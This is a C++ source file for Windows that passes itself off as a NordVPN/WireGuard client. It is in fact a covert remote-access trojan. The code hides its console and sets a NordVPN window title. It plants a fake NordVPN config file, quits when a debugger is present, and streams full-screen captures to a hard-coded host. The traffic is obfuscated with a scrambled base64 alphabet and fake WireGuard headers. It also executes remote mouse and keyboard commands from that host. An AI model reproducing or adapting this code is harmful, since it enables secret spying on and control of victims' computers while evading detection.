#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <random>
#include <sstream>
#include <vector>
#include <algorithm>
#include <fstream>
#include <memory>
#include <cstdint>

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <winternl.h>
#include <tlhelp32.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")

#define PROCESS_NAME "nordvpn.exe"
#define WINDOW_TITLE "NordVPN"

typedef NTSTATUS (NTAPI *pNtSetInformationProcess)(HANDLE, ULONG, PVOID, ULONG);
typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);

class WireGuardEncoder {
private:
    static const std::string chars;
    
public:
    static std::string encode(const std::vector<BYTE>& input) {
        std::string result;
        int val = 0, valb = -6;
        for (BYTE c : input) {
            val = (val << 8) + c;
            valb += 8;
            while (valb >= 0) {
                result.push_back(chars[(val >> valb) & 0x3F]);
                valb -= 6;
            }
        }
        if (valb > -6) result.push_back(chars[((val << 8) >> (valb + 8)) & 0x3F]);
        while (result.size() % 4) result.push_back('=');
        return result;
    }

    static std::vector<BYTE> decode(const std::string& input) {
        std::vector<int> T(256, -1);
        for (int i = 0; i < 64; i++) T[chars[i]] = i;
        
        std::vector<BYTE> result;
        int val = 0, valb = -8;
        for (unsigned char c : input) {
            if (T[c] == -1) break;
            val = (val << 6) + T[c];
            valb += 6;
            if (valb >= 0) {
                result.push_back((val >> valb) & 0xFF);
                valb -= 8;
            }
        }
        return result;
    }
};

const std::string WireGuardEncoder::chars = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890+/";

class ChaChaCompressor {
public:
    static std::vector<BYTE> compressRLE(const std::vector<BYTE>& data) {
        std::vector<BYTE> compressed;
        if (data.empty()) return compressed;
        
        for (size_t i = 0; i < data.size(); ) {
            BYTE current = data[i];
            BYTE count = 1;
            
            while (i + count < data.size() && data[i + count] == current && count < 255) {
                count++;
            }
            
            // Also encode literal 0xFF values to avoid sentinel conflicts
            if (count >= 3 || current == 0 || current == 0xFF) {
                compressed.push_back(0xFF);
                compressed.push_back(count);
                compressed.push_back(current);
            } else {
                for (BYTE j = 0; j < count; j++) {
                    compressed.push_back(current);
                }
            }
            i += count;
        }
        return compressed;
    }
};

struct WireGuardHeader {
    BYTE type;
    BYTE reserved[3];
    DWORD sender_index;
    ULONGLONG counter;
    BYTE nonce[12];
    
    WireGuardHeader() {
        type = 0x04;
        memset(reserved, 0, 3);
        sender_index = GetTickCount();
        counter = GetTickCount64();
        for (int i = 0; i < 12; i++) {
            nonce[i] = rand() % 256;
        }
    }
};

struct WireGuardPacket {
    WireGuardHeader header;
    std::vector<BYTE> encrypted_payload;
    BYTE auth_tag[16];
    
    WireGuardPacket(const std::vector<BYTE>& payload) {
        encrypted_payload = payload;
        for (int i = 0; i < 16; i++) {
            auth_tag[i] = rand() % 256;
        }
    }
    
    std::vector<BYTE> serialize() const {
        std::vector<BYTE> packet;
        packet.resize(sizeof(WireGuardHeader));
        memcpy(packet.data(), &header, sizeof(WireGuardHeader));
        
        packet.insert(packet.end(), encrypted_payload.begin(), encrypted_payload.end());
        packet.insert(packet.end(), auth_tag, auth_tag + 16);
        
        return packet;
    }
    
    static WireGuardPacket deserialize(const std::vector<BYTE>& data) {
        WireGuardPacket packet({});
        if (data.size() >= sizeof(WireGuardHeader) + 16) {
            memcpy(&packet.header, data.data(), sizeof(WireGuardHeader));
            
            size_t payload_size = data.size() - sizeof(WireGuardHeader) - 16;
            packet.encrypted_payload.assign(
                data.begin() + sizeof(WireGuardHeader),
                data.begin() + sizeof(WireGuardHeader) + payload_size
            );
            
            memcpy(packet.auth_tag, data.data() + data.size() - 16, 16);
        }
        return packet;
    }
};

class TunnelProtocol {
public:
    static std::string generateKey32() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 255);
        
        std::string key;
        for (int i = 0; i < 32; i++) {
            char hex[3];
            sprintf_s(hex, "%02x", dis(gen));
            key += hex;
        }
        return key;
    }
    
    static std::vector<BYTE> createTunnelPayload(const std::string& type, const std::string& data) {
        std::stringstream payload;
        payload << type << ":" << data;
        
        std::string payload_str = payload.str();
        std::vector<BYTE> result(payload_str.begin(), payload_str.end());
        
        while (result.size() % 16 != 0) {
            result.push_back(0x00);
        }
        
        return result;
    }
    
    static std::pair<std::string, std::string> extractTunnelPayload(const std::vector<BYTE>& payload) {
        std::string data(payload.begin(), payload.end());
        size_t colon_pos = data.find(':');
        if (colon_pos != std::string::npos) {
            std::string type = data.substr(0, colon_pos);
            std::string value = data.substr(colon_pos + 1);
            value.erase(std::find_if(value.rbegin(), value.rend(), [](unsigned char ch) {
                return ch != '\0';
            }).base(), value.end());
            return {type, value};
        }
        return {"", ""};
    }
};

class WireGuardCapture {
private:
    int screen_width;
    int screen_height;
    
public:
    WireGuardCapture() : screen_width(0), screen_height(0) {}
    
    bool initialize() {
        screen_width = GetSystemMetrics(SM_CXSCREEN);
        screen_height = GetSystemMetrics(SM_CYSCREEN);
        return (screen_width > 0 && screen_height > 0);
    }
    
    std::vector<BYTE> captureFrame() {
        HDC hdcScreen = GetDC(nullptr);
        HDC hdcMem = CreateCompatibleDC(hdcScreen);
        
        HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screen_width, screen_height);
        HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMem, hBitmap);
        
        BitBlt(hdcMem, 0, 0, screen_width, screen_height, hdcScreen, 0, 0, SRCCOPY);
        
        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = screen_width;
        bmi.bmiHeader.biHeight = -screen_height;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 24;
        bmi.bmiHeader.biCompression = BI_RGB;

        int stride = ((screen_width * 3 + 3) & ~3);
        int imageSize = stride * screen_height;
        std::vector<BYTE> rawData(imageSize);

        GetDIBits(hdcMem, hBitmap, 0, screen_height, rawData.data(), &bmi, DIB_RGB_COLORS);
            
        std::vector<BYTE> frameData(static_cast<size_t>(screen_width) * screen_height * 3);
        for (int y = 0; y < screen_height; ++y) {
            memcpy(frameData.data() + static_cast<size_t>(y) * screen_width * 3,
                   rawData.data() + static_cast<size_t>(y) * stride,
                   screen_width * 3);
        }
        
        SelectObject(hdcMem, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(nullptr, hdcScreen);
        
        return frameData;
    }
    
    int getWidth() const { return screen_width; }
    int getHeight() const { return screen_height; }
};

class WireGuardInput {
private:
    pNtSetInformationProcess NtSetInformationProcess;
    
public:
    WireGuardInput() {
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (ntdll) {
            NtSetInformationProcess = (pNtSetInformationProcess)GetProcAddress(ntdll, "NtSetInformationProcess");
        }
    }
    
    void sendMouseClick(int x, int y) {
        HWND target = WindowFromPoint({x, y});
        
        if (target) {
            POINT pt = {x, y};
            ScreenToClient(target, &pt);
            
            PostMessage(target, WM_LBUTTONDOWN, MK_LBUTTON, MAKELPARAM(pt.x, pt.y));
            Sleep(20);
            PostMessage(target, WM_LBUTTONUP, 0, MAKELPARAM(pt.x, pt.y));
        } else {
            SetCursorPos(x, y);
            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
            Sleep(20);
            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
        }
    }
    
    void sendRightClick(int x, int y) {
        HWND target = WindowFromPoint({x, y});
        
        if (target) {
            POINT pt = {x, y};
            ScreenToClient(target, &pt);
            
            PostMessage(target, WM_RBUTTONDOWN, MK_RBUTTON, MAKELPARAM(pt.x, pt.y));
            Sleep(20);
            PostMessage(target, WM_RBUTTONUP, 0, MAKELPARAM(pt.x, pt.y));
        } else {
            SetCursorPos(x, y);
            mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
            Sleep(20);
            mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
        }
    }
    
    void sendKeyPress(const std::string& key) {
        if (key.length() == 1) {
            char c = key[0];
            BYTE vk = VkKeyScan(c) & 0xFF;
            
            keybd_event(vk, 0, 0, 0);
            Sleep(10);
            keybd_event(vk, 0, KEYEVENTF_KEYUP, 0);
        } else if (key == "ENTER") {
            keybd_event(VK_RETURN, 0, 0, 0);
            Sleep(10);
            keybd_event(VK_RETURN, 0, KEYEVENTF_KEYUP, 0);
        } else if (key == "ESCAPE") {
            keybd_event(VK_ESCAPE, 0, 0, 0);
            Sleep(10);
            keybd_event(VK_ESCAPE, 0, KEYEVENTF_KEYUP, 0);
        }
    }
};

class TunnelStealth {
public:
    static void hideFromProcessList() {
        SetConsoleTitleA(WINDOW_TITLE);
        
        HWND consoleWindow = GetConsoleWindow();
        if (consoleWindow) {
            ShowWindow(consoleWindow, SW_HIDE);
        }
    }
    
    static void setProcessName(const char* name) {
        SetConsoleTitleA(name);
    }
    
    static bool isDebuggerPresent() {
        return IsDebuggerPresent() || CheckRemoteDebuggerPresent(GetCurrentProcess(), nullptr);
    }
    
    static void createWireGuardConfig() {
        std::string appData = getenv("APPDATA");
        std::string nordDir = appData + "\\NordVPN";
        
        CreateDirectoryA(nordDir.c_str(), nullptr);
        
        std::ofstream config(nordDir + "\\nordlynx.conf");
        if (config.is_open()) {
            config << "[Interface]\n";
            config << "PrivateKey = " << TunnelProtocol::generateKey32() << "\n";
            config << "Address = 10.5.0.2/32\n";
            config << "DNS = 103.86.96.100\n";
            config << "\n[Peer]\n";
            config << "PublicKey = " << TunnelProtocol::generateKey32() << "\n";
            config << "AllowedIPs = 0.0.0.0/0\n";
            config << "Endpoint = 192.168.88.3:443\n";
            config.close();
        }
    }
};

class WireGuardClient {
private:
    std::string server_host;
    int server_port;
    std::string session_id;
    std::random_device rd;
    std::mt19937 gen;
    SOCKET tcp_socket;
    
    WireGuardCapture screen_capture;
    WireGuardInput input_handler;
    std::vector<BYTE> last_frame_data;
    
    static bool sendAll(SOCKET s, const char* data, int len) {
        int sent = 0;
        while (sent < len) {
            int ret = send(s, data + sent, len - sent, 0);
            if (ret == SOCKET_ERROR) return false;
            sent += ret;
        }
        return true;
    }

    static bool recvAll(SOCKET s, char* data, int len) {
        int received = 0;
        while (received < len) {
            int ret = recv(s, data + received, len - received, 0);
            if (ret <= 0) return false;
            received += ret;
        }
        return true;
    }

    bool sendWireGuardPacket(const WireGuardPacket& packet) {
        if (tcp_socket == INVALID_SOCKET) return false;

        std::vector<BYTE> packet_data = packet.serialize();
        uint32_t len = htonl(static_cast<uint32_t>(packet_data.size()));

        if (!sendAll(tcp_socket, reinterpret_cast<const char*>(&len), sizeof(len))) return false;
        return sendAll(tcp_socket, reinterpret_cast<const char*>(packet_data.data()), packet_data.size());
    }

    WireGuardPacket receiveWireGuardPacket() {
        uint32_t len = 0;
        if (!recvAll(tcp_socket, reinterpret_cast<char*>(&len), sizeof(len))) {
            return WireGuardPacket({});
        }
        len = ntohl(len);
        if (len == 0 || len > 10 * 1024 * 1024) {
            return WireGuardPacket({});
        }
        std::vector<BYTE> data(len);
        if (!recvAll(tcp_socket, reinterpret_cast<char*>(data.data()), len)) {
            return WireGuardPacket({});
        }
        return WireGuardPacket::deserialize(data);
    }
    
    void processRemoteCommand(const std::string& commandData) {
        std::istringstream iss(commandData);
        std::string type;
        if (!std::getline(iss, type, ':')) return;
        
        if (type == "click") {
            int x, y;
            if (iss >> x && iss.ignore() && iss >> y) {
                input_handler.sendMouseClick(x, y);
            }
        } else if (type == "rightclick") {
            int x, y;
            if (iss >> x && iss.ignore() && iss >> y) {
                input_handler.sendRightClick(x, y);
            }
        } else if (type == "key") {
            std::string key;
            if (std::getline(iss, key)) {
                if (!key.empty() && key[0] == ':') {
                    key = key.substr(1);
                }
                input_handler.sendKeyPress(key);
            }
        }
    }

public:
    WireGuardClient(const std::string& host, int port)
        : server_host(host), server_port(port), gen(rd()), tcp_socket(INVALID_SOCKET) {}

    bool initializeConnection() {
        addrinfo hints{};
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_protocol = IPPROTO_TCP;

        addrinfo* result = nullptr;
        std::string port_str = std::to_string(server_port);
        if (getaddrinfo(server_host.c_str(), port_str.c_str(), &hints, &result) != 0) {
            return false;
        }

        for (addrinfo* rp = result; rp != nullptr; rp = rp->ai_next) {
            tcp_socket = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
            if (tcp_socket == INVALID_SOCKET) continue;

            if (connect(tcp_socket, rp->ai_addr, static_cast<int>(rp->ai_addrlen)) != SOCKET_ERROR) {
                break;
            }

            closesocket(tcp_socket);
            tcp_socket = INVALID_SOCKET;
        }

        freeaddrinfo(result);

        if (tcp_socket == INVALID_SOCKET) {
            return false;
        }

        DWORD timeout = 3000;
        setsockopt(tcp_socket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

        std::vector<BYTE> handshake_payload = TunnelProtocol::createTunnelPayload("handshake", "initiation");
        WireGuardPacket handshake(handshake_payload);

        if (!sendWireGuardPacket(handshake)) return false;

        WireGuardPacket response = receiveWireGuardPacket();
        auto [type, data] = TunnelProtocol::extractTunnelPayload(response.encrypted_payload);

        if (type == "session") {
            session_id = data;
            return true;
        }

        return false;
    }
    
    void checkForCommands() {
        fd_set readfds;
        FD_ZERO(&readfds);
        FD_SET(tcp_socket, &readfds);
        
        timeval timeout;
        timeout.tv_sec = 0;
        timeout.tv_usec = 1000;
        
        if (select(0, &readfds, nullptr, nullptr, &timeout) > 0) {
                WireGuardPacket packet = receiveWireGuardPacket();
            auto [type, data] = TunnelProtocol::extractTunnelPayload(packet.encrypted_payload);
            
            if (type == "input" && !data.empty()) {
                std::vector<BYTE> decoded_data = WireGuardEncoder::decode(data);
                std::string command(decoded_data.begin(), decoded_data.end());
                processRemoteCommand(command);
            }
        }
    }
    
    void sendDesktopFrame() {
        std::vector<BYTE> frameData = screen_capture.captureFrame();

        if (frameData.empty()) {
            std::cerr << "captureFrame returned empty; skipping send" << std::endl;
            return;
        }
        
        bool frameChanged = true;
        if (!last_frame_data.empty() && last_frame_data.size() == frameData.size()) {
            size_t differences = 0;
            for (size_t i = 0; i < frameData.size(); i += 100) {
                if (frameData[i] != last_frame_data[i]) differences++;
            }
            frameChanged = (differences > frameData.size() / 10000);
        }
        
        if (frameChanged) {
            std::vector<BYTE> compressed = ChaChaCompressor::compressRLE(frameData);
            std::string encoded = WireGuardEncoder::encode(compressed);
            
            std::stringstream payload;
            payload << session_id << "|";
            payload << screen_capture.getWidth() << "x" << screen_capture.getHeight() << "|";
            payload << encoded;
            
            std::vector<BYTE> tunnel_payload = TunnelProtocol::createTunnelPayload("screen", payload.str());
            WireGuardPacket packet(tunnel_payload);
            
            sendWireGuardPacket(packet);
            last_frame_data = frameData;
        }
    }
    
    void run() {
        TunnelStealth::hideFromProcessList();
        TunnelStealth::createWireGuardConfig();
        
        if (TunnelStealth::isDebuggerPresent()) {
            return;
        }
        
        if (!screen_capture.initialize()) {
            return;
        }
        
        while (true) {
            try {
                if (initializeConnection()) {
                    while (true) {
                        sendDesktopFrame();
                        checkForCommands();
                        
                        std::uniform_int_distribution<> dis(16, 33);
                        std::this_thread::sleep_for(std::chrono::milliseconds(dis(gen)));
                        
                        static int health_check = 0;
                        if (++health_check % 2000 == 0) {
                            std::vector<BYTE> keepalive_payload = TunnelProtocol::createTunnelPayload("keepalive", "ping");
                            WireGuardPacket keepalive(keepalive_payload);
                            if (!sendWireGuardPacket(keepalive)) {
                                break;
                            }
                        }
                    }
                }
                
                if (tcp_socket != INVALID_SOCKET) {
                    closesocket(tcp_socket);
                    tcp_socket = INVALID_SOCKET;
                }
                
                std::this_thread::sleep_for(std::chrono::seconds(30));
                
            } catch (...) {
                std::this_thread::sleep_for(std::chrono::seconds(10));
            }
        }
    }
    
    ~WireGuardClient() {
        if (tcp_socket != INVALID_SOCKET) {
            closesocket(tcp_socket);
        }
    }
};

int main(int argc, char* argv[]) {
    std::string host = "192.168.88.3";
    int port = 443;
    
    if (argc == 3) {
        host = argv[1];
        port = std::stoi(argv[2]);
    } else if (argc != 1) {
        return 1;
    }
    
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }
    
    WireGuardClient client(host, port);
    client.run();
    
    WSACleanup();
    return 0;
}
